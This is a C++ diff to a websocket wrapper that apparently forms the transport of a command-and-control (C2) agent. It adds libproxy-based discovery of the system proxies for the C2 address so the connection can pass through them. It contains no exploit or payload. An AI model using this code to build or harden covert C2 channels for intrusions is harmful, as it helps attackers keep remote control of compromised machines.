@@ -1,5 +1,6 @@
 #include <iostream>
 #include <thread>
+#include <set>
 
 #include <boost/asio/executor_work_guard.hpp>
 
@@ -9,6 +10,10 @@
 #include <wsinternal/bridge.h>
 #include <wsinternal/tcpconn.h>
 #include <wsinternal/wsconn.h>
+
+/* Import libproxy API */
+#include <proxy.h>
+
 
 namespace net = boost::asio;
 using wsinternal::wsstream;
@@ -44,6 +49,7 @@ class WebsocketsWrapper::impl {
 public:
     impl(std::string& c2_uri)
         : uri_(c2_uri)
+        , proxy_list_(get_proxies(c2_uri))
         , io_context_(net::io_context {})
         , ssl_context_(net::ssl::context::tlsv12_client)
         , aio_work_(net::executor_work_guard<net::io_context::executor_type>(io_context_.get_executor()))
@@ -64,7 +70,9 @@ public:
                   // Create a shared pointer that holds the socket by moving it into the shared storage
                   auto storage = std::make_shared<wsinternal::shared_storage>(std::move(socket));
 
-                  wsinternal::tcpconn::create(executor, uri_, proxy_, [&, storage](net::ip::tcp::socket&& wssocket) {
+                  // ToDo: Right now we are just using the first proxy on proxy_list but we should be trying all of the ones present
+                  // in proxy_list because some of them may not reach the C2
+                  wsinternal::tcpconn::create(executor, uri_, (*proxy_list_.begin()), [&, storage](net::ip::tcp::socket&& wssocket) {
                       auto executor = wssocket.get_executor();
 
                       // Create a new shared wsconn which will go do the whole song and dance to get connected to a websocket
@@ -81,6 +89,7 @@ public:
                   });
               })
     {
+
         acceptor_.accept_connections();
 
         // Get the local information and store it upon creation
@@ -98,9 +107,31 @@ public:
         io_runner_.join();
     }
 
+    std::set<std::string> get_proxies(std::string c2_uri)
+    {
+        char** proxies;
+        std::set<std::string> proxy_list{ "direct://" };
+        /* Create the proxy factory object */
+        pxProxyFactory* pf = px_proxy_factory_new();
+        if (!pf)
+        {
+            fprintf(stderr, "An unknown error occurred!\n");
+            return proxy_list;
+        }
+
+        proxies = px_proxy_factory_get_proxies(pf, c2_uri.c_str());
+        if (proxies != nullptr)
+            for (int j = 0; proxies[j]; j++) {
+                proxy_list.insert(proxies[j]);
+            }
+
+        px_proxy_factory_free_proxies(proxies);
+        return proxy_list;
+    }
+
 private:
     std::string uri_;
-    std::string proxy_ = std::string("direct://");
+    std::set<std::string> proxy_list_;
     net::io_context io_context_;
     net::ssl::context ssl_context_;
     net::executor_work_guard<net::io_context::executor_type> aio_work_;
